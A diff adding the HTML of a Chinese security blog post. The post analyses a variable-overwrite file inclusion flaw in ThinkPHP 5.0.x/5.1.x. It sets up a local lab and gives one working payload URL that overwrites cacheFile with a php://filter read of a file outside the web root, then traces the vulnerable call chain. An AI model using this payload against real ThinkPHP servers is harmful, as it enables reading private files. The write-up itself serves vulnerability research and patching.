@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ThinkPHP5的文件包含漏洞 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, php安全' />
+  <meta itemprop="name" content="ThinkPHP5的文件包含漏洞">
+  <meta itemprop="datePublished" content="2024-09-14T15:45:01+08:00">
+  <meta itemprop="dateModified" content="2024-09-14T15:45:01+08:00">
+  <meta itemprop="wordCount" content="126">
+  <meta itemprop="keywords" content="代码审计,Php安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/thinkphp5%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="ThinkPHP5的文件包含漏洞">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-14T15:45:01+08:00">
+    <meta property="article:modified_time" content="2024-09-14T15:45:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Php安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ThinkPHP5的文件包含漏洞">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/thinkphp5%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/rome%E9%93%BE/" /><link rel="next" href="https://dongyu29.github.io/about/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ThinkPHP5的文件包含漏洞",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/%E5%AE%A1%E8%AE%A1\/thinkphp5%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  126 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/%E5%AE%A1%E8%AE%A1\/thinkphp5%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\/","datePublished": "2024-09-14T15:45:01+08:00","dateModified": "2024-09-14T15:45:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">ThinkPHP5的文件包含漏洞</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>ThinkPHP5的文件包含漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-09-14 15:45:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-09-14">2024-09-14</time></span>&nbsp;<span title="126 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>One minute</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#搭环境">搭环境</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>加载模版解析变量时存在变量覆盖问题，导致文件包含漏洞的产生 漏洞影响版本：<strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong></p>
+<p>tp框架由两部分组成 应用项目: <a href="https://github.com/top-think/think"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/top-think/think</a> 核心框架: <a href="https://github.com/top-think/framework"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/top-think/framework</a> 框架下载好后，需要更名为thinkphp</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141109038.webp" alt="image-20240914110900875" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141109038.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141109038.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141109038.webp?size=large 2x" data-title="image-20240914110900875" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="搭环境" class="heading-element"><span>搭环境</span>
+  <a href="#%e6%90%ad%e7%8e%af%e5%a2%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>这里可以直接用composer来获取代码 通过以下命令获取测试环境代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>composer create-project --prefer-dist topthink/think<span style="color:#ff636f">=</span>5.0.18 tp5.0.18</span></span></code></pre></div><p>GPT:</p>
+<p><code>composer create-project --prefer-dist topthink/think=5.0.18 tp5.0.18</code> 是用于使用 Composer 创建一个基于 ThinkPHP 5.0.18 版本的新项目的命令。以下是命令各部分的解释：</p>
+<ol>
+<li><strong><code>composer create-project</code></strong>: 这是 Composer 的命令，用于从指定的包创建一个新项目。Composer 是 PHP 的依赖管理工具。</li>
+<li><strong><code>--prefer-dist</code></strong>: 这个选项表示 Composer 会优先下载压缩后的分发版本，而不是从源代码仓库克隆整个项目。这可以加快安装速度。</li>
+<li><strong><code>topthink/think=5.0.18</code></strong>: 这是指定的项目包名和版本。<code>topthink/think</code> 是 ThinkPHP 框架的 Composer 包名，<code>5.0.18</code> 是指定的版本号，表示安装 5.0.18 版本的 ThinkPHP。</li>
+<li><strong><code>tp5.0.18</code></strong>: 这是创建项目时指定的目录名称。该命令执行后，Composer 会在当前目录下创建一个名为 <code>tp5.0.18</code> 的目录，并将 ThinkPHP 5.0.18 版本的项目文件下载到该目录中。</li>
+</ol>
+<p>将 composer.json 文件的 require 字段设置成如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#a6be9d">&#34;require&#34;</span>: <span style="color:#ff636f">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#34;php&#34;</span>: <span style="color:#a6be9d">&#34;&gt;=5.6.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#34;topthink/framework&#34;</span>: <span style="color:#a6be9d">&#34;5.0.18&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">}</span>,</span></span></code></pre></div><p>然后执行 <code>composer update</code> ，并将 application/index/controller/Index.php 文件代码设置如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">namespace</span> <span style="color:#58a1dd">app\index\controller</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">use</span> <span style="color:#58a1dd">think\Controller</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">Index</span> <span style="color:#ff636f">extends</span> <span style="color:#58a1dd">Controller</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">index</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">assign</span>(<span style="color:#58a1dd">request</span>()<span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">get</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">fetch</span>(); <span style="color:#828b96;font-style:italic">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>创建 application/index/view/index/index.html 文件</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141118435.webp" alt="image-20240914111839294" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141118435.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141118435.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141118435.webp?size=large 2x" data-title="image-20240914111839294" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>用phpstydy跑起来，根目录设置为public</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141119053.webp" alt="image-20240914111919945" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141119053.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141119053.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141119053.webp?size=large 2x" data-title="image-20240914111919945" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>访问主页</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141119076.webp" alt="image-20240914111950972" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141119076.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141119076.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141119076.webp?size=large 2x" data-title="image-20240914111950972" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>在public的上级目录随便放一个flag.txt</p>
+<p>payload</p>
+<pre tabindex="0"><code>http://127.0.0.1:999/index.php?cacheFile=php://filter/read=convert.base64-encode/resource=../flag.txt</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141120868.webp" alt="image-20240914112006772" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141120868.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141120868.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141120868.webp?size=large 2x" data-title="image-20240914112006772" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="漏洞分析" class="heading-element"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>官方发布的 <strong>5.0.19</strong> 版本更新说明中，发现其中提到该版本包含了一个安全更新。</p>
+<p><a href="https://github.com/top-think/framework/compare/v5.0.18...v5.0.19"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/top-think/framework/compare/v5.0.18...v5.0.19</a></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141505170.webp" alt="image-20240914150504067" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141505170.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141505170.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141505170.webp?size=large 2x" data-title="image-20240914150504067" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>我们可以查阅其 <strong>commit</strong> 记录，发现其改进了模板引擎，其中存在危险函数 <strong>extract</strong> ，有可能引发变量覆盖漏洞。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141507087.webp" alt="image-20240914150707954" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141507087.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141507087.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141507087.webp?size=large 2x" data-title="image-20240914150707954" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用assign</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141518908.webp" alt="image-20240914151817676" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141518908.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141518908.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141518908.webp?size=large 2x" data-title="image-20240914151817676" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用到view的assign</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141519169.webp" alt="image-20240914151921866" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141519169.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141519169.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141519169.webp?size=large 2x" data-title="image-20240914151921866" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>存储到view的data里</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141520957.webp" alt="image-20240914152023710" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141520957.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141520957.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141520957.webp?size=large 2x" data-title="image-20240914152023710" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用view的fetch</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141521791.webp" alt="image-20240914152142517" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141521791.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141521791.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141521791.webp?size=large 2x" data-title="image-20240914152142517" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用Think的fetch</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141530609.webp" alt="image-20240914153044271" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141530609.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141530609.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141530609.webp?size=large 2x" data-title="image-20240914153044271" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再调用到template的fetch</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141533811.webp" alt="image-20240914153319661" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141533811.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141533811.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141533811.webp?size=large 2x" data-title="image-20240914153319661" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>最终调用到file的read</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141534261.webp" alt="image-20240914153433058" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141534261.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141534261.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141534261.webp?size=large 2x" data-title="image-20240914153433058" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>把cacheFile给覆盖以后直接include</p>
